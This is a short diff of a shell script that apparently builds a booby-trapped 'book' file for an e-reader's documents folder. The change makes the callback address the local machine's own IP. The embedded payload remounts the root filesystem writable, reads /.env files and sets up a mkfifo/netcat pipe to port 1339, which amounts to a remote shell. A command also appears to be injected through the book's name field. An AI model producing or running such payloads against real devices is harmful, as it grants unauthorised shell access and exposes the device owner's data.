@@ -6,7 +6,7 @@ FPATH_REMOTE_BOOKS="/mnt/us/documents"
 BOOK_NAME="dash"
 
 TX_PORT=1338
-STDOUT_IP=10.218.245.11
+STDOUT_IP=$(hostname -i | awk '{ print $1 }')
 STDOUT_PORT=1339
 
 book_content="\"#!/bin/sh\n# Name: ; run $BOOK_NAME\n# Author: winter\n\n mount -o rw,remount / && rm /tmp/f; mkfifo /tmp/f; source /.env; source /.env.config; cat /tmp/f | $FPATH_REMOTE 2>&1 | nc -w 15 $STDOUT_IP $STDOUT_PORT > /tmp/f \""
